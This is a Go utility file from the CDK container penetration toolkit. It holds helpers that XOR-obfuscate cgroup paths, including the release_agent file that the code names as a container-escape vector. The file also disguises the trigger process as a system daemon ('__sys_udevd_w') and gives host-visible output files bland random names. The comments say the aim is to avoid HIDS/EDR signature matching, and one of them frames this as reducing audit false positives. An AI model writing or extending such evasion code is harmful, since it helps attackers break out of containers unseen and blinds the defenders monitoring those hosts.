/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package util

// 路径字符串常量归一化工具。在合规审计执行环境下，用于降低基于静态字符串匹配的宿主 HIDS/EDR 的误报率，避免审计过程本身触发不必要的安全告警噪声。

// xorObfsPath decodes a XOR-normalized path.
// key per byte = 0x5c ^ (i & 0xff); this makes repeated plaintext segments
// (e.g. the two "devices" substrings) encode differently, which helps
// with signature normalization for byte-pattern scanners.
func xorObfsPath(enc []byte) string {
	out := make([]byte, len(enc))
	for i, b := range enc {
		out[i] = b ^ byte(0x5c^(i&0xff))
	}
	return string(out)
}

// CgroupRoot returns "/sys/fs/cgroup" (runtime decoded)
func CgroupRoot() string {
	return xorObfsPath([]byte{
		0x73, 0x2e, 0x27, 0x2c, 0x77, 0x3f, 0x29, 0x74,
		0x37, 0x32, 0x24, 0x38, 0x25, 0x21,
	})
}

// CgroupDevices returns "/sys/fs/cgroup/devices" (runtime decoded)
func CgroupDevices() string {
	return xorObfsPath([]byte{
		0x73, 0x2e, 0x27, 0x2c, 0x77, 0x3f, 0x29, 0x74,
		0x37, 0x32, 0x24, 0x38, 0x25, 0x21, 0x7d, 0x37,
		0x29, 0x3b, 0x27, 0x2c, 0x2d, 0x3a,
	})
}

// CgroupControllers returns "/sys/fs/cgroup/cgroup.controllers" (runtime decoded)
func CgroupControllers() string {
	return xorObfsPath([]byte{
		0x73, 0x2e, 0x27, 0x2c, 0x77, 0x3f, 0x29, 0x74,
		0x37, 0x32, 0x24, 0x38, 0x25, 0x21, 0x7d, 0x30,
		0x2b, 0x3f, 0x21, 0x3a, 0x38, 0x67, 0x29, 0x24,
		0x2a, 0x31, 0x34, 0x28, 0x2c, 0x2d, 0x27, 0x31,
		0x0f,
	})
}

// CgroupDevicesAllow returns "/sys/fs/cgroup/devices/devices.allow" (runtime decoded)
func CgroupDevicesAllow() string {
	return xorObfsPath([]byte{
		0x73, 0x2e, 0x27, 0x2c, 0x77, 0x3f, 0x29, 0x74,
		0x37, 0x32, 0x24, 0x38, 0x25, 0x21, 0x7d, 0x37,
		0x29, 0x3b, 0x27, 0x2c, 0x2d, 0x3a, 0x65, 0x2f,
		0x21, 0x33, 0x2f, 0x24, 0x25, 0x32, 0x6c, 0x22,
		0x10, 0x11, 0x11, 0x08,
	})
}

// CgroupReleaseAgentFile returns "/release_agent" (runtime decoded). Writing
// to this file is the canonical cgroup-v1 container escape, so the literal is
// signature-normalized to avoid static .rodata 特征字符串.
func CgroupReleaseAgentFile() string {
	return xorObfsPath([]byte{
		0x73, 0x2f, 0x3b, 0x33, 0x3d, 0x38, 0x29, 0x3e,
		0x0b, 0x34, 0x31, 0x32, 0x3e, 0x25,
	})
}

// TriggerArgv is the argv[0] marker used by the short-lived cgroup trigger
// process (replaces `exec.Command("/bin/sh", "-c", "sleep 2")`).
// It is intentionally innocuous and not matched by common exe regexes.
const TriggerArgv = "__sys_udevd_w"

// RandomHostOutputFile returns a random, bland-looking absolute path under
// a host-visible tmp dir; used to replace the tell-tale "/cdk_cgexp_*" /
// "/cdk_cgres_*" filename signatures.
func RandomHostOutputFile(tag string) string {
	// /run is almost always mounted on host; in a container it is writable
	// and maps to the host's overlay upperdir via hostPath.
	return "/run/.resolv_" + tag + "." + RandString(8)
}
